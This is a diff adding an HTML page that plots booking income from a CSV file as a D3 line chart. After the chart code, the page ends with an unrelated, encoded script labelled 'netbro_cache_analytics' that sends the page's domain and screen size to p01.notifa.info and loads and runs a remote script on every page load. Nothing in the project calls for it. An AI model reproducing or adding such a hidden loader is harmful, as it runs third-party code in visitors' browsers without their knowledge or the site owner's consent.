@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <script type = "text/javascript" src = "https://d3js.org/d3.v4.min.js"></script>
+      <style>
+         .line {
+            fill: none;
+            stroke: green;
+            stroke-width: 5px;
+         }
+      </style>
+   </head>
+
+   <body>
+      <script>
+         // set the dimensions and margins of the graph
+         var margin = {top: 20, right: 20, bottom: 30, left: 50},
+         width = 960 - margin.left - margin.right,
+         height = 500 - margin.top - margin.bottom;
+
+         // set the ranges
+         var x = d3.scaleTime().range([0, width]);
+         var y = d3.scaleLinear().range([height, 0]);
+
+         // define the line
+         var valueline = d3.line()
+            .x(function(d) { return x(d.tanggal_booking); })
+            .y(function(d) { return y(d.total_biaya); });
+
+         // append the svg obgect to the body of the page
+         // appends a 'group' element to 'svg'
+         // moves the 'group' element to the top left margin
+         var svg = d3.select("body").append("svg")
+            .attr("width", width + margin.left + margin.right)
+            .attr("height", height + margin.top + margin.bottom)
+            .append("g").attr("transform",
+               "translate(" + margin.left + "," + margin.top + ")");
+
+         // Get the data
+         d3.csv("pemasukan.csv", function(error, data) {
+            if (error) throw error;
+            // format the data
+            data.forEach(function(d) {
+               d.tanggal_booking = d.tanggal_booking;
+               d.total_biaya = +d.total_biaya;
+            });
+
+            // Scale the range of the data
+            x.domain(d3.extent(data, function(d) { return d.tanggal_booking; }));
+            y.domain([0, d3.max(data, function(d) { return d.total_biaya; })]);
+
+            // Add the valueline path.
+            svg.append("path")
+               .data([data])
+               .attr("class", "line")
+               .attr("d", valueline);
+
+            // Add the X Axis
+            svg.append("g")
+               .attr("transform", "translate(0," + height + ")")
+               .call(d3.axisBottom(x));
+
+            // Add the Y Axis
+            svg.append("g")
+               .call(d3.axisLeft(y));
+         });
+      </script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21sLtfgi1rfN9p%2faDz%2bLe3gzMuod%2bDV%2frrNikHEgpLtdbQ86KigBAnX5sg71aM8RbJjT5kYyc%2fUOmGOppVMz6VL3lcPFFKkn3DWgPPO94uWnYv2T6YOdGBXocVLAGUop2T3Z6nuBdpdpdaY9JpFjVSTrdDAmmrnh3ZdCjPT5fo%2f9NhWd7R6Y7Vs23SfbY4HtRAjysxULGnT9acp3xseYaUhamDCYz%2f1EY2gFe0IOvUzQKVcJsTjjLD4PruzF7SbNXIhLmb8CgSP0QbZakacvVf6OdnFh7dstLPA26pbk%2feNJSqIJxvIO8cfZRZbJTkEdAc%2fTQsmN4KcEpoqlckfkzAUW%2fmD%2bCLhKnbPMGFGV0yy9kkp8O2LjF6RLyUuHZTmKKBpl48QxZq%2fKI97%2fYy%2f3uUDWxyMwnCA8n1oXJAPAA79K4jXsjiCEScddKx1K%2ffskCli3f%2fetgnm2jM%2fcytl5M1J8X1drAkDEdiks%2fMyBezlscUsFlnADJJ41Egmanw5iQOo1AMR31YsjnLwsqrWJwlOxJxiRMa8S7vghGol0wPNLYICLpGIZfn3ZV1BNp6cSpJp35EsncXODGoYHMZekqV8qeqFJxDJH25TSqgr2BDLS6HdGMfycLcYwqFQA%2b6q%2b2AwRDMOu8faa57wkqNMh6LBMjxEkorGePI0P22v4NvOU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+   </body>
+</html>
